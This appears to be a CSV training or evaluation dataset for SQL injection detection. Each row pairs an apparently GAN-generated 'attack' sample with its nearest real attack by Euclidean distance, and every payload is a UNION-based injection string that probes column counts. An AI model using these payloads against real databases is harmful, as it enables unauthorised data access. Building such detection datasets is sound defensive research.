id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000068,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.992278163648652
GAN_000069,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.601465237651589
GAN_000070,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,5.492257680576795
GAN_000071,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,3.9291838074673904
GAN_000072,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,4.429698506061793
GAN_000073,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,5.889210181783026
GAN_000074,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,3.704483934921158
GAN_000075,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.618876712655192
GAN_000076,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.999220171311482
GAN_000077,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.429584251925855
GAN_000078,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,4.329443544038759
GAN_000079,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,4.8427787081488916
GAN_000080,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,5.398726650430374
GAN_000081,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.329230642492914
GAN_000082,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,4.018656599251905
GAN_000083,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,6.128274290592132
GAN_000084,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,4.91548840852781
GAN_000085,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.150037135044434
GAN_000086,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.9034376835353015
GAN_000087,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,4.964189021448556
GAN_000088,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,6.266664255191329
GAN_000089,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,4.534437104954527
GAN_000090,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.014387224421659
GAN_000091,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,5.931498494888569
GAN_000092,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,5.283474733718091
GAN_000093,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.188630281301468
GAN_000094,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.5842836042422155
GAN_000095,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,4.699140232861894
GAN_000096,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,4.037779752849734
GAN_000097,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,4.308510251793825
GAN_000098,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,4.810897151933983
GAN_000099,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.0416358144072495
GAN_000100,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,3.7283961087766486
GAN_000101,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.233589149620382
GAN_000102,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.080187677147077
GAN_000103,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,5.86193914361028
GAN_000104,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,5.1739840932605
GAN_000105,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,5.105715894802376
GAN_000106,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,4.606701652252455
GAN_000107,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.397274829891026
GAN_000108,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,5.438020051183896
GAN_000109,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,4.4408612142665795
GAN_000110,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,6.97349802519235
GAN_000111,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,4.751970204008559
GAN_000112,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,6.021095837068099
GAN_000113,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.036828897371203
GAN_000114,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,6.880951947554465
GAN_000115,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,8.310165552600493
GAN_000116,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,4.082540570959946
GAN_000117,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,4.9799353014084655
GAN_000118,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,3.9818361540993834
GAN_000119,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,5.01415936473702
GAN_000120,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,3.6904788571769918
GAN_000121,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,4.008540595341902
GAN_000122,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,6.022372103002875
GAN_000123,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,4.643350359823244
GAN_000124,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,6.310651251190178
GAN_000125,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,4.0320825035518135
GAN_000126,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,4.391996990433882
GAN_000127,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,6.182765240435849
GAN_000128,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,4.315205396333767
GAN_000129,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,6.058376059030531
GAN_000130,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,4.4687694819290265
GAN_000131,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.695241355368449
GAN_000132,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.537741382601079
GAN_000133,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.836658805977469
GAN_000134,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,4.716321165959122
GAN_000135,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.458791969406444
GAN_000136,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.918067532354789
GAN_000137,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.013316110131824
GAN_000138,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.567779435663781
GAN_000139,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,4.460981904624875
GAN_000140,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,6.188901405258969
GAN_000141,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,4.30140806059453
GAN_000142,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,4.201587805579795
GAN_000143,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.213967831935807
GAN_000144,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.548105591164275
GAN_000145,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.110134823633084
GAN_000146,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,4.2191574480461975
GAN_000147,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.022129970373712
GAN_000148,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,4.968127676867825
GAN_000149,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,4.428670667284585
GAN_000150,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000130,4.6569693220926895
GAN_000151,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,4.825565988433409
GAN_000152,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.745922509654554
GAN_000153,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.66334497765625
GAN_000154,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,5.127170659248215
GAN_000155,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.211614059308164
GAN_000156,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.810759741667201
GAN_000157,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.4755746207082
GAN_000158,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,4.835644320061165
GAN_000159,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,5.999302647382575
GAN_000160,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,7.168327809216433
GAN_000161,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,4.731877369431603
GAN_000162,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,5.0991025314274
GAN_000163,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,7.30398493258899
GAN_000164,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.5388943123789085
GAN_000165,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.4914022062683685
GAN_000166,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,4.7976334686473905
GAN_000167,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,7.16551825499446
GAN_000168,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,5.655067736731285
GAN_000169,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.741334474171991
GAN_000170,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,3.9233328680687323
GAN_000171,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.52019346237518
GAN_000172,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.837473136242829
GAN_000173,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,5.289980292080502
GAN_000174,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.299709256009043
GAN_000175,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.047085477337474
GAN_000176,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.673476477903147
GAN_000177,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,6.325803395637401
GAN_000178,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,4.545259023229033
GAN_000179,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.5638830389216825
GAN_000180,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.262971475096287
GAN_000181,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.168500810567898
GAN_000182,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.9400743842968
GAN_000183,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,4.847622265750033
GAN_000184,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.643843044843073
GAN_000185,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,4.273566037656705
GAN_000186,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.48557324754541
GAN_000187,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,3.9005701419376972
GAN_000188,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,3.7508888297703464
GAN_000189,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,4.804904489697683
GAN_000190,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,6.092191275760209
GAN_000191,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,5.314252615601445
GAN_000192,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.033204294790333
GAN_000193,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.141667694822373
GAN_000194,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,4.979732889945908
GAN_000195,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,4.724977303925408
